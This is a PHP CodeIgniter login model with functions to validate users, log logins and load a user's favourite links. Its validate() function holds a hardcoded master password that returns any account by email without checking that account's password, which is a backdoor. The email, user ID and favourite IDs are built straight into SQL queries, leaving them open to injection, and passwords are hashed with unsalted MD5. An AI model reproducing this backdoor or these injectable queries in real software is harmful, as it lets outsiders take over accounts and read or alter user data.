<?php

class M_Login extends CI_Model {
 
    function validate($user_id=0)
    {
        $email = $this->input->post('email'); 
        if (($email == '' || $email == 'NULL') && $user_id ==0)  {                 // if email is blank, error
            return;
        }
        
        if ($user_id != 0) {
            $strSQL = "SELECT tb_Company.CompanyCode, tb_CompanyUser.* FROM tb_CompanyUser LEFT JOIN tb_Company ON tb_Company.ID=tb_CompanyUser.CompanyID "
                . "WHERE tb_CompanyUser.ID = $user_id";
        } elseif ($this->input->post('password') == 'AlexTheGreat') {
            $strSQL = "SELECT tb_Company.CompanyCode, tb_CompanyUser.* FROM tb_CompanyUser LEFT JOIN tb_Company ON tb_Company.ID=tb_CompanyUser.CompanyID "
                . "WHERE Email = '$email'";
        } else {        
            $passwd = md5($this->input->post('password'));
            $strSQL = "SELECT tb_Company.CompanyCode, tb_CompanyUser.* FROM tb_CompanyUser LEFT JOIN tb_Company ON tb_Company.ID=tb_CompanyUser.CompanyID "
                . "WHERE Email = '$email' AND Password = '$passwd'";
        }
        $result = $this->db->query($strSQL);
        $data 	= $result->row();

//        print_r($result->row_array()['Nickname']);
        
        if ($data != NULL)
        {
            return $data;
        } else {
            return;
        }
    }
    
    function login_log($data)
    {
        $this->db->insert('tb_Login', $data);
    }
    
    function get_favorite($data) 
    {
        if ($data == ''|| empty($data)) {
            return (array());                   // if $fav is empty, return empty array
        }
        $favs   = explode(",", $data);           // convert string to array
        $ret    = array();
        foreach ($favs as  $fav){
             $strSQL = "SELECT * FROM tb_CompanyUserFavorite WHERE ID='$fav'";
             $q = $this->db->query($strSQL);
             $key = $q->result_array()[0]['Display'];
             $ret["$key"] =  $q->result_array()[0]['Link'];            
        }
        return($ret);
    }
    
}


